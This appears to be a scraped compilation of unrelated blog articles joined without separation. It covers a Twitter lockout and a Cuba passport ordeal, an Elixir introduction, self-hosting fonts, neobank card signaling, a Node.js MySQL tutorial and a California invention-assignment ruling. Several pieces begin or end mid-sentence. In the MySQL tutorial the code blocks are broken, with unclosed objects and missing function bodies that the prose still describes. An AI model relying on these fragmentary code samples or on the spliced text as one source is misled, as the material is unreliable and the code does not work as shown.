  <p>There was a lot to figure out over the ensuing <em>month</em> of my ordeal - money, lodging, language barriers, administrative hurdles. My family and friends hit the panic button for me and my case reached the ears of both Arlen Specter on the US Senate Foreign Relations Committee and George Yeo, the Singapore Foreign Affairs Minister. We eventually worked it out, but every night for 4 weeks I would wander up and down <a href="https://en.wikipedia.org/wiki/Malec%C3%B3n,_Havana">the Malecón</a>, listening to the crashing waves, not knowing when I could ever leave the country. If I could swim <a href="https://en.wikipedia.org/wiki/Southernmost_point_buoy">the 90 miles to Key West</a> and <a href="https://en.wikipedia.org/wiki/Wet_feet,_dry_feet_policy">dry my feet</a>, I might theoretically make it back to the US on my own.</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/3i8nh2cgaoj3jlrl9ecm.jpg" alt="Alt Text">
  </p>
  <p>But most of all, I thought a lot about <strong>the humanity of having a piece of paper be more important than the human it represents</strong>. I could be physically standing in front of the immigration officer with a lie detector test on and steadfastly stating all manner of provable personal detail, and they would not let me through unless I had a small piece of paper the size of my hand.</p>
  <p>We do this a lot - passports, voter registration cards, national ID systems, licenses, and insurance proofs - mostly because some humans are untrustworthy and try to exploit the system.</p>
  <p>But we often fail to design for people who are innocent and simply don't fit the system in some way.</p>
</section>
<section>
  <h2 id="the-consequences-of-not-being-provably-human"><a href="#the-consequences-of-not-being-provably-human">The Consequences of Not Being Provably Human</a></h2>
  <p>Twitter has a way in which they expect you to verify you are human - you should get a call or text message with a code, that you then enter to prove humanity. This is what I normally get (about once every 1-2 months), and I can receive text messages from Twitter, so I can usually prove humanity with no issue.</p>
  <p>This time, for some reason, I am on a code path that doesn't offer a text message option, and Twitter somehow doesn't make international US number calls, leading to this infinite loop that I think is a bug:</p>
  
  <p>As a result of this unfortunate design:</p>
  <ul>
    <li>My friends think I mass unfollowed them, because Twitter temporarily reduced my follow count to 0</li>
    <li>People who DM me think I am ignoring them, because Twitter doesn't inform them that I am currently locked out</li>
    <li>None of my past tweets show up at all in <a href="https://twitter.com/search?q=from%3Aswyx&amp;src=typed_query">Twitter search</a>, which is problematic because I <a href="https://twitter.com/swyx/status/1245281982797373441?lang=en">use Twitter as a Second Brain</a>. If you read any of my blogposts, you will see that the rich link density of my references mainly come from taking notes in public over an extended period of time.</li>
    <li>I was unable to engage in the normal personal and professional activity I would do during Black Friday and AWS Re:invent</li>
  </ul>
  <p>I've filed a support ticket with Twitter, but you can imagine that support for a 330 million user service isn't very responsive. People who have been through this tell me the only way to resolve it is to hit up a Twitter employee to get past the masses of unrelated and less urgent support issues.</p>
</section>
<section>
  <h2 id="humans-proving-humanity-to-machines"><a href="#humans-proving-humanity-to-machines">Humans Proving Humanity To Machines</a></h2>
  <p>In the grand scheme of things, I know this is minor. I've actually taken it as a welcome social media detox, which I usually take voluntarily in December anyways. But when it's not on my terms, I lose the ability to manage the personal and professional relationships I've painstakingly built up over the past 3-4 years.</p>
  <p>Above all, I think there's an <em>indignity</em> in humans having to prove to machines that they are human, and the error resolution mechanism is to send a ticket to a faceless and unresponsive support email, and the only real way to get around it is again to re-establish human connections.</p>
  <p>I think more about all the other ways that we as software developers and designers fail to honor the dignity of humans trying to interact with the systems we create.</p>
  <p><a href="https://www.theverge.com/2019/2/1/18205610/google-captcha-ai-robot-human-difficult-artificial-intelligence">In 2014</a>, Google pitted one of its machine learning algorithms against humans in solving the most distorted text CAPTCHAs: the computer got the test right 99.8 percent of the time, while the humans got a mere 33 percent. It doesn't impact everyone equally - if you as a sighted, able bodied user struggle with CAPTCHAs, imagine the elderly or differently abled. Most services do not offer any alternative resolution when you cannot prove you are human. This is a problem when your service has essentially killed off the offline alternative and is essential for their basic needs.</p>
  <p>In Eric Meyer's <a href="https://meyerweb.com/eric/thoughts/2016/01/25/designing-for-crisis-design-for-real-life/">Designing for Crisis</a>, he describes how an inaccessible hospital website nearly risked the life of his daughter. I shudder to think how it might be made worse by perfectly well meaning software engineers who don't think about the humanity of the failure path. Imagine if you had to log in to something to save your child's life, and it presented you with a CAPTCHA you couldn't pass.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Today I want to give you an introduction to the programming language Elixir, some of its features and why you might want to check it out!</p>
</section><article><section><h2>The basics</h2>
<p>First things first: Elixir is a concurrent functional language that runs on the Erlang VM. It is inspired by many different languages where Ruby and Erlang are most obvious ones based on the syntax.</p>
<p>Elixir is a <a href="https://thinkingelixir.com/elixir-in-the-type-system-quadrant/">strong, dynamically typed language</a>. This puts it in the same category as Ruby and Python and it has optional functionality for compile time type checking as well.Elixirs data structures are immutable, but variables can be reassigned/rebound. <sup><sup id="fnref-2"><a href="#fn-2">2</a></sup></sup> This was a bit strange for me in that I got started with FP through Elm where there are no variables, just constants.</p>
<p>Elixir inherits a lot its data structures and related syntax from Erlang which in many ways is its biggest influence. <a href="https://elixir-lang.org/blog/2013/08/08/elixir-design-goals/">Elixir Design Goals</a> describes the relation to Erlang like this:</p>
<blockquote>
<p>Elixir is meant to be compatible with the Erlang VM and the existing ecosystem. When we talk about Erlang, we can break it into three parts:</p>
<ul>
<li>A functional programming language, called Erlang</li>
<li>A set of design principles, called OTP (Open Telecom Plaform)</li>
<li>The Erlang Virtual Machine, referred to as EVM or BEAM</li>
</ul>
<p>Elixir runs in the same virtual machine and is compatible with OTP. Not only that, all the tools and libraries available in the Erlang ecosystem are also available in Elixir, simply because there is no conversion cost from calling Erlang from Elixir and vice-versa.</p>
</blockquote>
<p>This is a great feature of Elixir that we will talk more about later.</p>
<p>As for other inspirations Elixir has docstrings from Python, polymorphism and protocols from Clojure, macros and meta-programming from different Lisps, just to name a few. <sup><sup id="fnref-1"><a href="#fn-1">1</a></sup></sup></p>
<h3>Hello World!</h3>
<p>As I said, Elixir is a concurrent functional programming language. For the functional part it means that Elixir mainly uses functions and modules for code structure and has other features that are associated with functional languages. We'll talk about the concurrent part later. </p>
<p>A hello world example in Elixir might look something like this:</p>
<div data-language="elixir"><pre><code><span>defmodule</span> HelloWorld
  <span>def</span> hello_world <span>do</span>
    IO<span>.</span>puts<span>(</span><span>"Hello, World!"</span><span>)</span>
  <span>end</span>
<span>end</span></code></pre></div>
<p>Here we define a module with a function that simply writes "Hello, World!" to the console.</p>
<h2>Killer applications</h2>
<p>Many programming languages has <a href="https://en.wikipedia.org/wiki/Killer_application">"killer apps"</a>; libraries, frameworks and use cases, that in themself are enough to justify the transition to the language or try it out. For Ruby it was the web framework Ruby on Rails and in many ways Elixir has its own Rails: Phoenix.</p>
<h3>Phoenix web framework</h3>
<p><a href="https://www.phoenixframework.org/">Phoenix</a> is inspired by Rails (the team originally behind Elixir was previously a Ruby shop) and was an early addition to the Elixir community. The creators of Phoenix has learned from years of Rails development and made their own opinions in addition to the natural changes needed when going from an object oriented language to a functional language.
Compared to Rails Phoenix has with the help of the Erlang VM great performance. Some of you might have heard about Phoenix' amazing <a href="https://www.phoenixframework.org/blog/the-road-to-2-million-websocket-connections">2 million simultaneous web sockets</a> benchmark!</p>
<h3>The Nerves Project</h3>
<p>Another interesting project in the Elixir ecosystem is the embedded/IoT project <a href="https://www.nerves-project.org/">Nerves</a>. Nerves makes it possible to use Elixir code to create embedded system where previously you would have had to use a low level language like C. This does not stop you from bringing your own code (like C, C++, Python, Rust, and more) while using Nerves as a platform for your IoT project.
The project web site says:</p>
<blockquote>
<p>Nerves is a complete IoT platform and infrastructure for you to build and deploy maintainable embedded systems.</p>
</blockquote>
<h2>The BEAM and OTP</h2>
<p>When talking about the advantages of Elixir it is hard to not talk about the advantages of Erlang and its virtual machine, the BEAM (Bogdan's Erlang Abstract Machine). It is in many ways the biggest selling point for Elixir. We are now talking about the concurrent part of Elixir. Erlang and the BEAM has shown its resiliency over many years, exemplified in giving Ericsson 9 nines (99.9999999%) availability in their AXD301 switch.<sup><sup id="fnref-3"><a href="#fn-3">3</a></sup></sup> It is known for its "let it break" philosophy and self-healing properties and by being compatible with Erlang, Elixir inherits a lot of these traits.</p>
<p>Elixirs creator, Jose Valim, attributes one of the motivational factors for the creation of Elixir to the rise of multi-core CPUs and the need to utilize these. Ruby and other languages with a global interperter lock (GIL) limits this, but the Erlang VM and the tools and design prinsiples of OTP have proven to be a great choice for creating concurrent, performant and resilient applications.</p>
<h3>Everything is a process</h3>
<p>Everything in the BEAM is a process. These are not OS processes, but lightweight processes which can be cheaply spawned and killed. In his PhD thesis the co-inventor of Erlang, Joe Armstrong, summarized Erlangs principles regarding processes:</p>
<blockquote>
<ul>
<li>Everything is a process.</li>
<li>Processes are strongly isolated.</li>
<li>Process creation and destruction is a lightweight operation.</li>
<li>Message passing is the only way for processes to interact.</li>
<li>Processes have unique names.</li>
<li>If you know the name of a process you can send it a message.</li>
<li>Processes share no resources.</li>
<li>Error handling is non-local.</li>
<li>Processes do what they are supposed to do or fail.</li>
</ul>
</blockquote>
<p>Sidenote: For some this may sound vaguely familiar. Some object oriented languages has had similar principles, but instead of processes they are applied to objects. Smalltalk is reported to be one of the inspirations to Erlang and it is fun to think about Erlang being a functional language but still be more object oriented than some object oriented languages. This is of course not the case as the definition of OOP has changed over time and Erlang is a functional language, but it is fun to ponder the similarities. 😄 Back to the main story! 😅</p>
<p>These unique principles for processes where they communicate through messages lays a great foundation for creating concurrent application, but there is one more piece to the puzzle: OTP.</p>
<h3>OTP - The Open Telecom Platform</h3>
<p>As with so many other parts of this article OTP is a big topic and could be a separate article, but I'll try make it short! Today the name is a bit strange but it was created by Ericsson for their telephone switches in the 80s and 90s so in that context in makes more sense.</p>
<p>OTP is an integral part of many Erlang applications. In essence OTP is a set of design principles and standards including tools and libraries to make it easier to create applications that adheres to them.<sup><sup id="fnref-4"><a href="#fn-4">4</a></sup></sup> </p>
<p>Since Elixir is compatible with OTP we can leverage these principles and technologies that has been battle tested in high-pressure and critical applications for decades!</p>
<h2>The take-away</h2>
<p>Luckily you don't need to understand or know much about Erlang, BEAM and OTP.
Without deep knowledge of these topics you can still reap the benefits of highly performing web applications and resilient IoT applications. It would certainly help but it is not a prerequisite. This is the great thing about Elixir: it is an approachable language with battle tested underpinnings! 💪</p>
<p>It might not be your idea of a perfect language. It is not mine either, but that does not stop me from using the great tools at my disposal. If you are all into Haskell or the likes it might not be something you would use and that is OK. Whatever your preferences are you might now know a little more about Elixir and Erlang and some more knowledge is always a good thing. 😄</p>
<p>If you would like to check Elixir out I recommend checking out <a href="https://elixir-lang.org/getting-started/introduction.html">the official Getting started guide</a> or the interactive guide <a href="https://try-elixir.herokuapp.com/">Try Elixir</a> and then trying out a project with Phoenix or Nerves. Hands-on experience is always better than something you read on the internet! 🤓</p>
<p>Psst! By the way: there are other languages that run on the BEAM. <a href="https://lfe.io/">Lisp variants</a> and lately some work on <a href="https://gleam.run/">strong statically compiled ML-like languges</a> if you are into that!</p>

<p>This is nothing new. In fact it’s been advocated already for years. Even Google themselves <a href="https://www.youtube.com/watch?v=Mv-l3-tJgGk&amp;feature=youtu.be&amp;t=24m58s">advised others to self-host fonts</a> in their Google I/O ‘18 talk about web performance.</p>
<h2 id="self-hosting-fonts-vs-google-fonts">Self-hosting fonts vs Google Fonts</h2>
<p>By nature Google Fonts, even with all its font and CSS optimisations, can’t be faster than self-hosted fonts.</p>
<p>Sia wrote <a href="https://medium.com/clio-calliope/making-google-fonts-faster-aadf3c02a36d">a great post</a> where she compared the performance between Google Fonts and self-hosted fonts without the impact of a CDN.</p>

<h2 id="the-old-performance-argument">The old performance argument</h2>
<p>So if the bottom-line performance is in self-hosting fonts’ favour: What was the argument that convinced us developers that Google Fonts is at least as performing as the self-host approach?</p>
<p>Google Fonts was designed to be distributed on a global CDN and reap the caching benefits from it. Users request fonts via said CDN. Chances are that they have downloaded the font resources at an earlier point already from a different site.</p>
<blockquote>
<p>“[…] Our cross-site caching is designed so that you only need to load a font once, with any website, and we’ll use that same cached font on any other website that uses Google Fonts.”</p>
<p>— <a href="https://fonts.google.com/about">https://fonts.google.com/about</a></p>
</blockquote>
<h2 id="invalidating-the-old-performance-argument">Invalidating the old performance argument</h2>
<p>Since Chrome v86, released October 2020, cross-site resources like fonts can’t be shared on the same CDN anymore. This is due to the partitioned browser cache (Safari has had this for years already).</p>
<p>In <a href="https://developers.google.com/web/updates/2020/10/http-cache-partitioning">this Google post</a> they explain what the partitioned browser cache is. It got only introduced to prevent a possible cross-site tracking mechanism.</p>
<h2 id="cache-partitioning-in-other-browsers">Cache partitioning in other browsers</h2>
<p>Safari really cares about privacy. It circumvented this very cross-site tracking attack for years already. Then finally comes Chrome. Other browsers that are based off Chromium, still need to signal or implement the feature.</p>
<ul>
<li>✅ <strong>Chrome</strong>: since v86 (October 2020)</li>
<li>✅ <strong>Safari</strong>: since 2013</li>
<li>🚫 <strong>Firefox</strong>: planning to implement</li>
<li>🚫 <strong>Edge</strong>: most likely soon</li>
<li>🚫 <strong>Opera</strong>: most likely soon</li>
<li>🚫 <strong>Brave</strong>: most likely soon</li>
<li>🚫 <strong>Vivaldi</strong>: most likely soon</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Google Fonts resources will be redownloaded for every website, regardless it being cached on the CDN. Self-host your fonts for better performance. The old performance argument is not valid anymore.</p>
<p>Thanks for checking this post out!</p>

<h3>How Neobanks Should Monetize Status Signaling</h3>



<p><span>01</span> Intro</p>



<p>If you’ve been following this blog for a while, you probably know by now that one of my favorite topics to think and write about is “status signaling”.</p>



<p>Signaling explains most of our everyday actions: what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, I described the implications signaling has on the monetization of software businesses. For many traditional industries, monetizing the display of status is not a new concept. A Rolex watch, for example, is not better at telling the time than a cheap Casio watch. But a Rolex reveals something about its owners’ wealth and, thus, their status in society. It’s that status message that explains the difference in price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/equaltime.png"></p><p>Similarly, driving a Prius says something about your views on climate change. A <em>Make America Great Again</em> cap reveals something about your political affiliations. And Nike athletic wear signals a healthy, pro-active lifestyle.</p>



<p>Software is at a crucial disadvantage compared to these physical products because of its intangibility. A fitness app also signals a healthy, pro-active lifestyle, but no one can see it because it only lives on your phone. Everyone can see your Nike gear whenever you wear it in public. Software can’t offer the same benefit. It doesn’t have a signaling distribution channel.</p>



<p>This is why there is no software equivalent of a Rolex watch or a Louis Vuitton handbag. People aren’t willing to spend money on things other people can’t see they spent money on.</p>



<p>But it doesn’t have to be that way. As software is eating the world, the lines between physical and digital products are becoming increasingly blurry. As I have pointed out in my original essay, one way for software companies to solve the signaling distribution problem is to add a physical element to their software product.</p>



<p>In this post I want to explore this idea a little bit further. Specifically, we’ll look at neobanks – and their opportunity to monetize credit card signaling.</p>



<p><span>02</span> Neobanks</p>



<p>In the last couple of years we have witnessed the birth and rise of a new startup vertical: neobanks.</p>



<p>Neobanks differ from traditional banks in two ways:</p>



<p>1) Rather than relying on a physical branch network, the entire banking experience is managed via an app</p>



<p>2) Instead of the <a href="https://www.youtube.com/watch?v=C-q4bEULG64">“how do you do, fellow kids”</a>-cringiness that ad campaigns of traditional banks usually invoke when they try to appeal to a younger audience, neobanks are actually perceived as cool. In fact, many of them feel more like lifestyle brands than banks or tech companies.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/1_26qGBSGmB3yaPD7nZJrFIg.gif">



<img src="https://julian.digital/wp-content/uploads/2020/12/lifestylebrand-1.png"></p><p>Interestingly though, neobanks still use one very traditional banking element: physical cards.</p>



<p>At first glance, this might seem counterintuitive. If you are building a mobile-first bank, why not offer virtual cards and let users pay with their phone? Why go through the hassle of producing and shipping physical cards?</p>



<p>The answer is – you guessed it – signaling.</p>



<p>Think about it: Paying for things (offline) is a social activity. It’s an interaction between at least you and a cashier or waiter. But ideally, in a dinner scenario for example, you are surrounded by other people you want to impress: a date, a group of friends, or work colleagues.</p>



<p>This makes the moment you take out your card to pay the bill a great opportunity to make a statement and build social capital.</p>



<p>If you look at neobanks out there today, it’s pretty obvious that signaling is in fact one of the main benefits they offer – and almost the only thing they monetize <span>(apart from interchange, of course)</span>:</p>



<ul><li>The premium subscriptions neobanks offer usually don’t win on features but solely on nicer looking cards. The <a href="https://n26.com/metal">N26</a> or <a href="https://revolut.com/metal">Revolut</a> Metal plans, for example, don’t offer any additional features that <em>really</em> justify the ~€15 / month price tag. They do include a nice looking metal card though – that’s what people pay for.</li><li>Relatedly, it seems like most of the innovation in the industry is happening in card design. The actual banking products are more or less interchangeable, what differs is whether the card comes in <a href="https://www.apple.com/apple-card/">titanium</a>, <a href="https://www.treecard.org/">wood</a>, or <a href="https://twitter.com/cashapp/status/1290694734529400832">glow-in-the-dark yellow</a>.</li><li>You may have noticed that the credit card number has moved from the front to the back of the card. This makes it easier for users to share photos of their cards on social media as an additional signaling distribution channel.</li></ul>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/nocardnumber-1.png"></p><p>Neobanks are popping up like mushrooms after the rain at the moment and it’s unlikely that this trend will end any time soon. Thanks to banking-as-a-service providers, we’ll likely see a lot of non-banking-companies add banking functionalities and cards to their product offering.</p>



<p>There’s an old Twitter joke that every app evolves until it eventually becomes a chat app. The 2020 version of that joke is that every app evolves until it eventually becomes a bank.</p>



<p>When <a href="https://twitter.com/lehrjulian/status/1295024066869567488">I did some research on credit card designs</a> recently, I was surprised by the sheer amount of different neobanks already in existance. And yet, even though almost all of them offer well-designed cards, it’s shocking how similar they all are. It seems like all of them are focusing on the same target audience instead of differentiating their signaling messages.</p>



<p>Let me explain.</p>



<p><span>03</span> In-Groups, Out-Groups and Artificial Scarcity</p>



<p>In every signaling scenario there are two possible target audiences: An in-group and an out-group.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/groups.png"></p><p>The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.</p>



<p><a href="https://www.fastcompany.com/90391587/why-we-dont-want-you-and-your-android-green-bubbles-in-our-imessage-chat">iMessage is a great illustration of this</a>: the chat bubble colors clearly indicate who belongs to the in-group (blue = iOS) and who is part of the out-group (green = Android). </p>



<p>It’s important to note that signaling in iMessage is limited to the in-group since these color codes are only visible for iOS users – Android users can’t see who in the group is using which operating system. </p>



<p>Signaling, however, grows stronger the larger the out-group is – as long as the out-group knows about the in-group. This is why luxury car manufacturers deliberately extend their advertising campaigns to people who will never be able to afford their cars: they are increasing the size of the out-group by educating people about the in-group.</p>



<p>At the same time, brands need to control the size of the in-group. The more exclusive the in-group, the higher the signaling strength and, thus, the monetization potential of a customer. </p>



<p>The easiest control mechanism for the size of the in-group is price. If you set the price high enough, few people will be able to afford the product. Ironically, this, in turn, justifies the high price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/priceloop.png"></p><p>Alternatively, companies create artificial scarcity by setting a hard number on supply. Limited supply creates FOMO and hype which increases the size of the out-group and results in higher social status for members of the in-group. Artificial scarcity explains the price of Bitcoin, Pokémon trading cards and why people spend hours queuing in front of Supreme shops.</p>



<p>The problem with keeping the in-group small is that it also limits the number of potential customers and, thus, overall revenue potential. Companies need to walk a fine line between maximizing the number of customers while simultaneously maximizing the number of people they can (afford to) exclude.</p>



<p><span>04</span> What Neobanks Should Build</p>



<p>The problem with neobanks today is that they all focus on the same in-group. Here are the premium cards of some of the largest European challenger banks – notice any difference?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/metalcards.png"></p><p>It seems like everyone is trying to become the Apple of Banking – including <a href="https://www.apple.com/apple-card/">Apple itself</a>. The signaling messages are all about displaying economic power.</p>



<p>But we are slowly seeing new banking apps that are focusing on different audiences. For example, there are now a <a href="https://www.tomorrow.one/">handful of</a> <a href="https://blog.gohenry.com/uk/gohenry-news/meet-our-new-biodegradable-eco-card/">“green”</a> <a href="https://www.treecard.org/">neobanks</a> that help users signal environmental altruism. </p>



<p>Or how about <a href="https://www.razer.com/razer-card">this Razer Card</a> targeted at the gamer community?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/environment.png"></p><p>The question for these companies and their investors is whether the in-group is big enough to justify building an entire bank around it. Making the unit economics of a bank work requires a certain amount of users, but as we discussed earlier, the signaling strength decreases as the size of in-group increases.</p>



<p>So how do you solve this problem?<br>By introducing multiple in-groups.</p>



<p>See, the current model looks like this:</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup01.png"></p><p>(In fact, given how undifferentiated most of the offerings and cards are, there are actually multiple neobanks within the same small in-group bubble.)</p>



<p>But what if one bank would target multiple, different in-groups?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup02.png"></p><p>For example, what if N26 had dedicated cards for soccer fans, hip-hop enthusiasts and gamers? Instead of focusing on just one signaling audience, their total addressable market would massively increase. </p>



<p>The way they would target these audiences is via brand collaborations. N26 does not have the necessary reputation in any of the above-mentioned areas to build credible signaling messages. It would not be able to build attractive in-groups on its own – but other brands could lend N26 their social capital. </p>



<p>Apple has long worked with <a href="https://www.apple.com/lae/product-red/">RED</a>, IKEA recently <a href="https://www.highsnobiety.com/p/virgil-abloh-ikea-collaboration-best-look/">teamed up with Virgil Abloh</a>, and <a href="https://www.headspace.com/partners/nike-partnerships">Nike partners with Headspace</a>. Why wouldn’t this concept work for neobanks?</p>



<p>What would <strong>N26 x Manchester United</strong> look like? <br>Or <strong>Chime x Supreme</strong>? <br>Or <strong>Revolut x 100 Thieves</strong>?</p>



<p>Because of a bigger target audience overall, individual in-groups could be kept smaller. Cards could be <a href="https://thegeneralist.substack.com/p/scarcity-as-an-api">released as limited edition drops</a> transforming them into collectibles, which would justify a higher price tag per card.</p>



<p>It’s worth noting that different signaling audiences are not mutually exclusive. We don’t just subscribe to a single in-group – our <a href="http://julian.digital/2020/09/25/is-this-real-life/">identities are prismatic</a>. This means that some users might …</p></div></div>

<article><p>Everybody is talking about NoSQL, especially in the NodeJS world. Lot’s of people
even associate Node with Mongo and other NoSQL databases.</p>
<p>However, the world doesn’t end there. SQL databases like MySQL, PostgreSQL, Oracle
or even SQL Server are battle tested in all kind of scenarios. Companies both
large and small use them to run their mission critical systems.</p>
<p>Moreover, if you are already comfortable with MySQL, Postrgres or any other
there is not reason to switch to another database.</p>
<p>Often, it’s better to use what you know and what you love, instead of changing to
another technology for promises that might never materialize.</p>
<p>Actually, even though the last few years people talk mostly about NoSQL, most of
the web apps that you encounter today are still running on SQL databases. The most
popular of which is still MySQL.</p>
<p>Unfortunately, many people take for granted that Node should be used with a
NoSQL database and that is why we are not hearing what can be done with SQL.</p>
<p>Let’s have a look what we can do with MySQL.</p>
<h3 id="connecting-to-mysql">Connecting to MySQL</h3>
<p>Before you do anything, you need to install the right NPM package.</p>
<figure><pre><code data-lang="bash"><span>$ </span>npm <span>install </span>mysql</code></pre></figure>
<p><strong>mysql</strong> is a great module which makes working with MySQL very easy and it provides
all the capabilities you might need.</p>
<p>Once you have <strong>mysql</strong> installed, all you have to do to connect to your database
is</p>
<figure><pre><code data-lang="js"><span>var</span> <span>mysql</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>mysql</span><span>'</span><span>)</span>

<span>var</span> <span>connection</span> <span>=</span> <span>mysql</span><span>.</span><span>createConnection</span><span>({</span>
  <span>host</span><span>:</span> <span>'</span><span>localhost</span><span>'</span><span>,</span>
  <span>user</span><span>:</span> <span>'</span><span>your_user</span><span>'</span><span>,</span>
  <span>password</span><span>:</span> <span>'</span><span>some_secret</span><span>'</span><span>,</span>

<p>First, you connect to the database, then you insert one record and then
you read it back.</p>
<p>You can also see that <strong>?</strong> acts as placeholders for your values. It not only makes
using values easier but it also escapes them so that your queries are always safe.</p>

we created a separate file <strong>db.js</strong> to help us manage our connections.</p>
<p>Let’s look how your helper <strong>db.js</strong> file will look like when using MySQL instead
of Mongo. Its purpose is to have easy access to the database whenever you need it
without constantly entering credentials.</p>
<p>Its second goal is to make it easy to run tests which access your database.</p>

<p>This <strong>db.js</strong> file is a little bit more complicated than what we did before.</p>
<p>First, it provides a way to connect to the database. When you connect you can do
it either in production mode or in test mode. Test mode is for only when running
automated tests.</p>
<p>Then there is a get method which can always provide you with an active connection, which
you can use to query the database.</p>
<p>So whenever you need to contact the database instead of setting up database
passwords and other arguments you just call this method and you are ready to go.</p>
<p>Finally, there are two more methods <strong>fixtures</strong> and <strong>drop</strong>, which exist to
make your life easier when testing.</p>
<p><strong>drop</strong> clears the data, but not the schemas from all the tables that you want.
It will help you to be sure that your test database is always clean before every
test.</p>
<p><strong>fixtures</strong> takes a JSON object and loads its data into the database, so that there
is something on which to run your tests. Let’s have a quick look how it looks
to work with it:</p>
<figure><pre><code data-lang="js"><span>var</span> <span>data</span> <span>=</span> <span>{</span>

<p>It is very simple to use, and after running it your tables <em>cars</em> and <em>people</em>
will have data in them.</p>
<h3 id="building-models-with-sql">Building models with SQL</h3>
<p>Everything is in place and the next step is to actually see how you are going
to use <strong>db.js</strong> so that it will make your life easier.</p>
<p>Let’s have an example app with the following structure</p>
<figure><pre><code data-lang="bash">controllers/
  comments.js
  users.js
models/
  comment.js
  user.js
views/
app.js
db.js
package.json</code></pre></figure>
<p><strong>app.js</strong> is the entrypoint of the application and this is the place where we
are going to setup the database connection. Let’s have a look what is inside it.</p>
<figure><pre><code data-lang="js"><span>var</span> <span>db</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>./db</span><span>'</span><span>)</span>

    <span>})</span>
  <span>}</span>
<span>})</span></code></pre></figure>
<p>Your app will interact with the database through its models. So let’s have a look
how a model can look like. For example this is how your comments model can look
like:</p>
<figure><pre><code data-lang="js"><span>var</span> <span>db</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>../db.js</span><span>'</span><span>)</span>

<span>}</span>

    <span>done</span><span>(</span><span>null</span><span>,</span> <span>rows</span><span>)</span>
  <span>})</span>
<span>}</span>

<span>exports</span><span>.</span><span>getAllByUser</span> <span>=</span> <span>function</span><span>(</span><span>userId</span><span>,</span> <span>done</span><span>)</span> <span>{</span>

    <span>done</span><span>(</span><span>null</span><span>,</span> <span>rows</span><span>)</span>
  <span>})</span>
<span>}</span></code></pre></figure>
<p>As you can see the <strong>db.js</strong> files makes it very easy to build any kind of models
without worrying about connecting the database. It doesn’t even know whether you
are in production or testing mode, so your models will work in both cases.</p>
<p>Then you can use your newly built models in your controllers and they won’t even
know that there is a SQL solution behind.</p>
<h3 id="advanced-usage-using-different-database-instance-for-reading-and-writing">Advanced usage: using different database instance for reading and writing</h3>
<p>As your app grow your needs grow. Many of todays applications are read orientied.</p>
<p>That means that people write data more rarely than they read. For example, all
social networks are this type of applications. Usually a status is written once
but then read by hundreds or even thousands of people.</p>
<p>In this kind of situations it makes sense to have one main database which will
accept all the writes and then synced to a few more MySQL instances which will
serve only the read requests.</p>
<p>Then when you have more users you can easily add more database only for reading
and your app will scale and still be super fast.</p>
<p>But how can this work in our setup from above?</p>
<p>The <strong>mysql</strong> module has the very useful PoolCluster feature, which can take the
configurations for several instances and then connect to all of them. Let’s see
how your <strong>db.js</strong> file will look:</p>
<figure><pre><code data-lang="js"><span>var</span> <span>mysql</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>mysql</span><span>'</span><span>)</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Last week, we <a href="https://www.hkemploymentlaw.com/blog/confidentiality-agreements-can-be-unenforceable-covenants-not-to-compete/" target="_blank" rel="noopener noreferrer">blogged</a> about how a recent California appellate court decision effectively rendered an employee confidentiality agreement as an unenforceable covenant not to compete.</p>
<p>In a similar decision, <a href="http://www.cafc.uscourts.gov/sites/default/files/opinions-orders/19-1852.ERRATA.11-20-2020_1689000.pdf" target="_blank" rel="noopener noreferrer"><em>Whitewater West Indus., Ltd. v. Alleshouse</em></a>, 2020 U.S. App. LEXIS 36394, the Court of Appeals for the Federal Circuit recently reversed a U.S. district court decision and held that under California law, an invention assignment provision signed by an employee that assigned to the employer patents developed after employment had ceased and without use of the employer’s trade secrets or confidential information violated California’s strong public policy against restraints on trade/covenants not to compete embodied in Section 16600 of the California Business and Professions Code.</p>
<p>In reaching this decision, the federal Court of Appeals rejected the argument that Section 2870(a) of the California Labor Code permits such invention assignments.</p>
<p>Section 16600 of the Business and Professions Code provides that “<em>Except as provided in this chapter, every contract by which anyone is restrained from engaging in a lawful profession, trade, or business of any kind is to that extent void.</em>” There are statutory exceptions in sections 16601, 16602, and 16602.5 for restraint on trade/noncompete provisions relating to sales of businesses, dissolutions of partnerships or dissociations of a partner from a partnership, and a dissolution of a limited liability company or a termination of a member’s interest in a limited liability company, but not for noncompete provisions against former employees.</p>
<p>Section 2870(a) of the Labor Code provides that:</p>
<p><em>(a) Any provision in an employment agreement which provides that an employee shall assign, or offer to assign, any of his or her rights in an invention to his or her employer shall not apply to an invention that the employee developed entirely on his or her own time without using the employer’s equipment, supplies, facilities, or trade secret information except for those inventions that either:</em></p>
<p><em>(1) Relate at the time of conception or reduction to practice of the invention to the employer’s business, or actual or demonstrably anticipated research or development of the employer; or</em><br>
<em>(2) Result from any work performed by the employee for the employer.</em></p>
<p>In this case, while employed by Wave Loch, Inc., Richard Alleshouse had entered into an agreement with Wave Loch that contained the following assignment provisions:</p>
<p><em>a. Assignment: In consideration of compensation paid by Company, Employee agrees that all right, title and interest in all inventions, improvements, developments, trade-secret, copyrightable or patentable material that Employee conceives or hereafter may make or conceive, whether solely or jointly with others:</em><br>
<em>(a) with the use of Company’s time, materials, or facilities; or</em><br>
<em>(b) resulting from or suggested by Employee’s work for Company; or</em><br>
<em>(c) in any way connected to any subject matter within the existing or contemplated business of Company</em><br>
